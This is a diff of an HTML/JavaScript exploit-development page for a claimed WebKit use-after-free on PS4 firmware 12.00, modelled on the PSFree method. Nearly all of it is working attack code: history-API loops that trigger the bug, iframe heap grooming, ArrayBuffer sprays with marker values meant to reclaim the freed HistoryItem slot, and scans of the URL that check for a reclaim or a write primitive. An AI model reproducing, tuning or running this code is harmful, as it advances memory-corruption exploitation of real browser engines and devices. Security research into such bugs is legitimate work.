@@ -1,17 +1,15 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Controlled Write Primitive</title>
+<title>PS4 12.00 - Correct PSFree Timing</title>
 </head>
 <body>
-<h2>PS4 12.00 WebKit - Controlled Write via UAF</h2>
+<h2>PS4 12.00 - UAF with Correct PSFree Timing</h2>
 <p>Status: <span id="status">Ready</span></p>
 
-<button onclick="runBucketShotgun()">BUCKET SHOTGUN - Multi-size Reclaim</button>
-<button onclick="runControlledWrite()">CONTROLLED WRITE - Safe pointers</button>
-<button onclick="runReadBackTest()">READ BACK - Verify write success</button>
+<button onclick="runCorrectTiming()">CORRECT TIMING - PSFree method</button>
+<button onclick="runDelayedSpray()">DELAYED SPRAY - Post-UAF reclaim</button>
 
 <pre id="log"></pre>
 
@@ -28,28 +26,71 @@ function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 var keepAlive = [];
 
 // =====================================================
-// BUCKET SHOTGUN - Multiple sizes simultaneously
+// CORRECT TIMING - Separate UAF from Spray
 // =====================================================
-async function runBucketShotgun(){
+async function runCorrectTiming(){
   logEl.textContent = "";
   keepAlive = [];
-  statusEl.textContent = "Running Bucket Shotgun...";
+  statusEl.textContent = "Running Correct Timing...";
   
-  log("=== BUCKET SHOTGUN ATTACK ===\n");
-  log("Strategy: Spray multiple ArrayBuffer sizes");
-  log("Goal: Hit the exact HistoryItem bucket (80 bytes)\n");
+  log("=== CORRECT TIMING (PSFree Method) ===\n");
+  log("Key difference: UAF FIRST, spray AFTER\n");
   
-  // Define bucket sizes based on PSFree
+  // PHASE 1: Trigger UAF COMPLETELY
+  log("[PHASE 1] Triggering UAF (no spray yet)");
+  
+  let size = 977;
+  const STEP = 14461;
+  
+  for(let i=0; i<48; i++){
+    let frag = "X".repeat(size);
+    
+    history.pushState({}, "", "#" + frag);
+    history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  log("  UAF sequence complete\n");
+  
+  // PHASE 2: Wait for UAF to stabilize
+  log("[PHASE 2] Waiting for UAF window (120ms)...");
+  await sleep(120);
+  
+  // PHASE 3: Heap grooming (from PSFree)
+  log("\n[PHASE 3] Heap grooming with iframes");
+  let frames = [];
+  for(let i=0; i<80; i++){
+    let f = document.createElement("iframe");
+    document.body.appendChild(f);
+    try {
+      let d = f.contentDocument;
+      d.open();
+      d.write("<html><body>X</body></html>");
+      d.close();
+    } catch(e){}
+    frames.push(f);
+  }
+  frames.forEach(f=>f.remove());
+  log("  Grooming complete\n");
+  
+  await sleep(80);
+  
+  // PHASE 4: NOW spray (after UAF is stable)
+  log("[PHASE 4] Multi-size spray in stable UAF state");
+  
   const BUCKETS = [
-    { size: 64,  marker: 0x43434343, name: "64b" },   // CCCC
-    { size: 80,  marker: 0x41414141, name: "80b" },   // AAAA (target)
-    { size: 96,  marker: 0x42424242, name: "96b" },   // BBBB
-    { size: 128, marker: 0x44444444, name: "128b" }   // DDDD
+    { size: 64,  marker: 0x43434343 },
+    { size: 80,  marker: 0x41414141 },
+    { size: 96,  marker: 0x42424242 },
+    { size: 128, marker: 0x44444444 }
   ];
   
-  log("[PHASE 1] Pre-spray for bucket warmup");
-  for(let b of BUCKETS) {
-    for(let i=0; i<100; i++) {
+  for(let k=0; k<200; k++) {
+    for(let b of BUCKETS) {
       let buf = new ArrayBuffer(b.size);
       let view = new Uint32Array(buf);
       for(let j=0; j<view.length; j++) view[j] = b.marker;
@@ -57,303 +98,210 @@ async function runBucketShotgun(){
     }
   }
   
-  // Create holes
-  keepAlive = keepAlive.filter((_, i) => i % 4 !== 0);
-  log(`  Sprayed ${keepAlive.length} buffers with holes\n`);
+  log(`  Sprayed ${BUCKETS.length * 200} buffers\n`);
   
-  await sleep(50);
+  await sleep(100);
   
-  // Trigger UAF
-  log("[PHASE 2] Triggering UAF (48 iterations)");
-  
-  let size = 977;
-  const STEP = 14461;
-  
-  for(let i=0; i<48; i++){
-    let frag = "V".repeat(size);
-    
-    history.pushState({}, "", "#" + frag);
-    history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    // CRITICAL ITERATION
-    if(i === 47) {
-      log("\n>>> CRITICAL WINDOW <<<");
-      log("[PHASE 3] Multi-bucket spray in UAF window");
-      
-      // Free HistoryItem
-      setTimeout(()=>history.back(), 0);
-      
-      // IMMEDIATE multi-size spray
-      for(let k=0; k<200; k++) {
-        for(let b of BUCKETS) {
-          let buf = new ArrayBuffer(b.size);
-          let view = new Uint32Array(buf);
-          for(let j=0; j<view.length; j++) view[j] = b.marker;
-          keepAlive.push(buf);
-        }
-      }
-      
-      log(`  Sprayed ${BUCKETS.length * 200} buffers`);
-      
-      // Force GC
-      setTimeout(() => {
-        for(let i=0; i<4; i++) new ArrayBuffer(8*1024*1024);
-      }, 20);
-    }
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  await sleep(400);
-  
-  log("\n[PHASE 4] Checking result");
-  checkReclaim(BUCKETS);
-}
-
-function checkReclaim(buckets) {
-  let url = document.URL;
-  
-  log("\nScanning URL for bucket markers:");
-  
-  let found = false;
-  for(let b of buckets) {
-    // Check if marker appears in URL
-    let markerBytes = String.fromCharCode(
-      b.marker & 0xFF,
-      (b.marker >> 8) & 0xFF,
-      (b.marker >> 16) & 0xFF,
-      (b.marker >> 24) & 0xFF
-    );
-    
-    if(url.includes(markerBytes)) {
-      log(`  ✓ ${b.name}: FOUND (marker: ${b.marker.toString(16)})`);
-      found = true;
-    } else {
-      log(`  ✗ ${b.name}: not found`);
-    }
-  }
-  
-  if(found) {
-    log("\nSUCCESS: Bucket reclaim confirmed!");
-    log("HistoryItem slot was reused by our ArrayBuffer");
-    statusEl.textContent = "WRITE PRIMITIVE CONFIRMED";
-  } else {
-    log("\nNo markers found - checking for crash...");
-    log("NOTE: If browser crashes soon, write succeeded");
-    log("(Crash = wrote invalid pointer = proof of write)");
-  }
-  
-  log("\n=== BUCKET SHOTGUN END ===");
+  // PHASE 5: Check result
+  log("[PHASE 5] Checking reclaim");
+  checkForMarkers(BUCKETS);
 }
 
 // =====================================================
-// CONTROLLED WRITE - Use VALID pointers
+// DELAYED SPRAY - Even longer delay
 // =====================================================
-async function runControlledWrite(){
+async function runDelayedSpray(){
   logEl.textContent = "";
   keepAlive = [];
-  statusEl.textContent = "Running Controlled Write...";
+  statusEl.textContent = "Running Delayed Spray...";
   
-  log("=== CONTROLLED WRITE TEST ===\n");
-  log("Strategy: Write SAFE data that won't crash\n");
+  log("=== DELAYED SPRAY (Extended Wait) ===\n");
+  log("Testing if longer delay improves reclaim\n");
   
-  // Instead of 0x41414141 (invalid), use ASCII range
-  // These won't crash when dereferenced
-  
-  log("[PHASE 1] Creating safe fake objects");
-  
-  const SAFE_PATTERN = 0x20202020; // All spaces (valid ASCII)
-  
-  for(let i=0; i<500; i++) {
-    let buf = new ArrayBuffer(80);
-    let view = new Uint32Array(buf);
-    
-    // Fill with safe pattern
-    for(let j=0; j<view.length; j++) {
-      view[j] = SAFE_PATTERN + j; // Incrementing pattern
-    }
-    
-    keepAlive.push(buf);
-  }
-  
-  log(`  Created ${keepAlive.length} safe buffers\n`);
-  
-  await sleep(50);
-  
-  // Trigger UAF
-  log("[PHASE 2] Triggering UAF");
+  // PHASE 1: UAF
+  log("[PHASE 1] Triggering UAF");
   
   let size = 977;
   const STEP = 14461;
   
   for(let i=0; i<48; i++){
-    let frag = "V".repeat(size);
+    let frag = "Y".repeat(size);
     
     history.pushState({}, "", "#" + frag);
     history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
     
     if(i % 6 === 0) setTimeout(()=>history.back(), 0);
     
-    if(i === 47) {
-      log("\n[PHASE 3] Safe buffer spray in UAF window");
-      
-      setTimeout(()=>history.back(), 0);
-      
-      for(let k=0; k<300; k++) {
-        let buf = new ArrayBuffer(80);
-        let view = new Uint32Array(buf);
-        for(let j=0; j<view.length; j++) view[j] = SAFE_PATTERN + k;
-        keepAlive.push(buf);
-      }
-    }
-    
     size += STEP;
     await sleep(5);
   }
   
-  await sleep(400);
+  log("  UAF complete\n");
   
-  log("\n[PHASE 4] Checking for safe write");
+  // PHASE 2: EXTENDED wait
+  log("[PHASE 2] Extended wait (300ms)...");
+  await sleep(300);
+  
+  // PHASE 3: Iframe grooming
+  log("\n[PHASE 3] Iframe grooming");
+  let frames = [];
+  for(let i=0; i<80; i++){
+    let f = document.createElement("iframe");
+    document.body.appendChild(f);
+    try {
+      let d = f.contentDocument;
+      d.open();
+      d.write("<html><body>Y</body></html>");
+      d.close();
+    } catch(e){}
+    frames.push(f);
+  }
+  frames.forEach(f=>f.remove());
+  
+  await sleep(100);
+  
+  // PHASE 4: Focused spray (only likely sizes)
+  log("\n[PHASE 4] Focused spray (80, 96 bytes only)");
+  
+  // Based on PSFree: HistoryItem is 80 bytes
+  // With header, might be 96
+  const FOCUSED_SIZES = [
+    { size: 80,  marker: 0x50505050, name: "80b" },  // PPPP
+    { size: 96,  marker: 0x51515151, name: "96b" }   // QQQQ
+  ];
+  
+  for(let k=0; k<500; k++) {
+    for(let s of FOCUSED_SIZES) {
+      let buf = new ArrayBuffer(s.size);
+      let view = new Uint32Array(buf);
+      for(let j=0; j<view.length; j++) view[j] = s.marker;
+      keepAlive.push(buf);
+    }
+  }
+  
+  log(`  Sprayed ${FOCUSED_SIZES.length * 500} focused buffers\n`);
+  
+  await sleep(150);
+  
+  // PHASE 5: Check
+  log("[PHASE 5] Checking result");
   
   let url = document.URL;
   
-  // Look for space characters (0x20)
-  let spaceCount = 0;
-  for(let i=0; i<Math.min(url.length, 10000); i++){
-    if(url.charCodeAt(i) === 0x20) spaceCount++;
-  }
+  log("\nLooking for focused markers:");
   
-  log(`Space chars found: ${spaceCount}`);
-  
-  if(spaceCount > 100) {
-    log("\nSUCCESS: Safe write confirmed!");
-    log("Browser didn't crash = data was valid");
-    log("High space count = our pattern leaked");
-    statusEl.textContent = "CONTROLLED WRITE SUCCESS";
-  } else {
-    log("\nNo obvious pattern - may need size adjustment");
-  }
-  
-  log("\n=== CONTROLLED WRITE END ===");
-}
-
-// =====================================================
-// READ BACK - Verify written data
-// =====================================================
-async function runReadBackTest(){
-  logEl.textContent = "";
-  keepAlive = [];
-  statusEl.textContent = "Running Read Back Test...";
-  
-  log("=== READ BACK TEST ===\n");
-  log("Strategy: Write known pattern, read it back\n");
-  
-  // Write sequential counter
-  log("[PHASE 1] Creating sequential pattern");
-  
-  for(let i=0; i<500; i++) {
-    let buf = new ArrayBuffer(80);
-    let view = new Uint32Array(buf);
+  for(let s of FOCUSED_SIZES) {
+    let found = false;
     
-    // Each buffer has unique sequential ID
-    for(let j=0; j<view.length; j++) {
-      view[j] = (i << 16) | j; // Encode buffer ID and offset
-    }
-    
-    keepAlive.push(buf);
-  }
-  
-  log(`  Created ${keepAlive.length} sequential buffers\n`);
-  
-  await sleep(50);
-  
-  log("[PHASE 2] Triggering UAF");
-  
-  let size = 977;
-  const STEP = 14461;
-  
-  for(let i=0; i<48; i++){
-    let frag = "W".repeat(size); // Use 'W' instead of 'V'
-    
-    history.pushState({}, "", "#" + frag);
-    history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
-    
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    if(i === 47) {
-      log("\n[PHASE 3] Sequential spray");
-      
-      setTimeout(()=>history.back(), 0);
-      
-      for(let k=0; k<300; k++) {
-        let buf = new ArrayBuffer(80);
-        let view = new Uint32Array(buf);
-        for(let j=0; j<view.length; j++) view[j] = (k << 16) | j;
-        keepAlive.push(buf);
-      }
-    }
-    
-    size += STEP;
-    await sleep(5);
-  }
-  
-  await sleep(400);
-  
-  log("\n[PHASE 4] Reading back and analyzing");
-  
-  let url = document.URL;
-  
-  // Check if we see 'W' (original) or numbers (our data)
-  let wCount = 0;
-  let nonW = 0;
-  
-  for(let i=0; i<Math.min(url.length, 5000); i++){
-    if(url.charCodeAt(i) === 0x57) { // 'W'
-      wCount++;
-    } else {
-      nonW++;
-    }
-  }
-  
-  log(`'W' chars: ${wCount}`);
-  log(`Non-W chars: ${nonW}`);
-  
-  if(nonW > 100) {
-    log("\nSUCCESS: Read back confirmed!");
-    log("Original data (W) was replaced");
-    log("This proves read-write cycle works");
-    
-    // Try to decode some values
-    log("\nSample decoded values:");
-    for(let i=0; i<Math.min(100, url.length); i++){
+    // Check for marker bytes
+    for(let i=0; i<Math.min(url.length, 10000); i++){
       let code = url.charCodeAt(i);
-      if(code !== 0x57 && code > 0) {
-        let bufferId = code >> 16;
-        let offset = code & 0xFFFF;
-        if(bufferId < 300 && offset < 20) {
-          log(`  Offset ${i}: buffer ${bufferId}, offset ${offset}`);
+      if(code === (s.marker & 0xFF)) {
+        // Check if full dword matches
+        if(i+3 < url.length) {
+          let val = url.charCodeAt(i) |
+                    (url.charCodeAt(i+1) << 8) |
+                    (url.charCodeAt(i+2) << 16) |
+                    (url.charCodeAt(i+3) << 24);
+          
+          if(val === s.marker) {
+            log(`  ✓ ${s.name}: FOUND at offset ${i}`);
+            found = true;
+            break;
+          }
         }
       }
     }
     
-    statusEl.textContent = "READ-WRITE VERIFIED";
+    if(!found) {
+      log(`  ✗ ${s.name}: not found`);
+    }
   }
   
-  log("\n=== READ BACK END ===");
+  // Also check original pattern
+  let yCount = 0;
+  for(let i=0; i<Math.min(url.length, 5000); i++){
+    if(url.charCodeAt(i) === 0x59) yCount++; // 'Y'
+  }
+  
+  log(`\nOriginal 'Y' pattern: ${yCount} chars`);
+  
+  if(yCount < 4000) {
+    log("NOTICE: Y count reduced - data may have changed");
+  }
+  
+  log("\n=== DELAYED SPRAY END ===");
 }
 
-log("PS4 12.00 WebKit - Controlled Write Primitive");
-log("\nBased on your crash results:");
-log("- TEST 1 (State) crashed = WRITE happened");
-log("- TEST 3 (ArrayBuffer) crashed = WRITE happened");
-log("\nNow attempting CONTROLLED writes:");
-log("1. Bucket Shotgun - find exact size");
-log("2. Controlled Write - use safe data");
-log("3. Read Back - verify read-write cycle");
-log("\nGoal: Write without crashing = controlled primitive");
+function checkForMarkers(buckets) {
+  let url = document.URL;
+  
+  log("\nScanning for bucket markers:");
+  
+  let totalFound = 0;
+  
+  for(let b of buckets) {
+    let count = 0;
+    
+    for(let i=0; i<Math.min(url.length-3, 20000); i++){
+      let val = url.charCodeAt(i) |
+                (url.charCodeAt(i+1) << 8) |
+                (url.charCodeAt(i+2) << 16) |
+                (url.charCodeAt(i+3) << 24);
+      
+      if(val === b.marker) {
+        count++;
+        if(count === 1) {
+          log(`  ${b.size}b: FOUND at offset ${i} (marker: 0x${b.marker.toString(16)})`);
+        }
+      }
+    }
+    
+    if(count > 0) {
+      log(`    Total occurrences: ${count}`);
+      totalFound += count;
+    } else {
+      log(`  ${b.size}b: not found`);
+    }
+  }
+  
+  if(totalFound > 0) {
+    log(`\n✓ SUCCESS: Found ${totalFound} marker instances`);
+    log("✓ ArrayBuffer reclaimed HistoryItem slot");
+    statusEl.textContent = "RECLAIM CONFIRMED";
+  } else {
+    log("\nNo markers found");
+    
+    // Check if still original pattern
+    let xCount = 0;
+    for(let i=0; i<Math.min(url.length, 5000); i++){
+      if(url.charCodeAt(i) === 0x58) xCount++;
+    }
+    
+    log(`Original 'X' chars: ${xCount}`);
+    
+    if(xCount > 4000) {
+      log("\nDIAGNOSIS: UAF slot not reclaimed by ArrayBuffers");
+      log("Possible reasons:");
+      log("  1. Timing still not optimal");
+      log("  2. Size mismatch (need different bucket)");
+      log("  3. Heap allocator behavior different in 12.00");
+    }
+  }
+  
+  log("\n=== CORRECT TIMING END ===");
+}
+
+log("PS4 12.00 - Correct PSFree Timing");
+log("\nKey insight from PSFree:");
+log("- UAF must complete FIRST");
+log("- THEN wait for stabilization");
+log("- THEN spray ArrayBuffers");
+log("\nPrevious tests sprayed DURING UAF loop");
+log("This separates the phases correctly");
+log("\nTests:");
+log("1. Correct Timing - PSFree method (120ms wait)");
+log("2. Delayed Spray - Extended wait (300ms)");
 </script>
 </body>
 </html>
